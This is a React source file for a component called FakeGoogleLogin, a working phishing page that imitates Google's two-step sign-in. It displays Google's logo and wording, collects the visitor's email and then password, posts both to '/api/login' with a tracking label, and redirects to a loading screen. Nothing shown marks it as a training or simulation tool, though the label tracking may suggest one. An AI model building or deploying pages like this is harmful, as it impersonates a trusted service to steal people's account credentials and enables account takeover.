
import React, { useState } from 'react';
import styled from 'styled-components';
import { motion } from 'framer-motion';
import { useNavigate, useLocation } from 'react-router-dom';


const FakeGoogleLoginContainer = styled(motion.div)`
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
`;

const FakeGoogleLoginForm = styled.div`
  background: white;
  padding: 40px;
  border-radius: 8px;
  box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
  width: 450px;
  text-align: center;
`;

const Title = styled.h1`
  font-size: 24px;
  font-weight: 400;
  margin-bottom: 10px;
`;

const Subtitle = styled.p`
  font-size: 16px;
  margin-bottom: 30px;
`;

const Input = styled.input`
  width: 100%;
  padding: 15px;
  margin-bottom: 20px;
  border: 1px solid #ccc;
  border-radius: 5px;
  font-size: 1rem;
`;

const ButtonContainer = styled.div`
  display: flex;
  justify-content: flex-end;
`;

const Button = styled.button`
  padding: 10px 25px;
  background: #1a73e8;
  color: white;
  border: none;
  border-radius: 5px;
  font-size: 1rem;
  cursor: pointer;
`;



const FakeGoogleLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState('email');
  const navigate = useNavigate();
  const location = useLocation();
  const { button } = location.state || { button: 'unknown' };

  const handleNext = () => {
    if (step === 'email') {
      setStep('password');
    } else {
        // Always send email and password when the form is submitted (after both steps)
        fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password, button: `google-${button}` }),
        });
      navigate('/loading');
    }
  };

  return (
    <FakeGoogleLoginContainer
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
    >
      <FakeGoogleLoginForm>
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
        {step === 'email' ? (
          <>
            <Title>Sign in</Title>
            <Subtitle>Use your Google Account</Subtitle>
            <Input
              type="email"
              placeholder="Email or phone"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <ButtonContainer>
              <Button onClick={handleNext}>Next</Button>
            </ButtonContainer>
          </>
        ) : (
          <>
            <Title>Welcome</Title>
            <Subtitle>{email}</Subtitle>
            <Input
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <ButtonContainer>
              <Button onClick={handleNext}>Next</Button>
            </ButtonContainer>
          </>
        )}
      </FakeGoogleLoginForm>
    </FakeGoogleLoginContainer>
  );
};

export default FakeGoogleLogin;
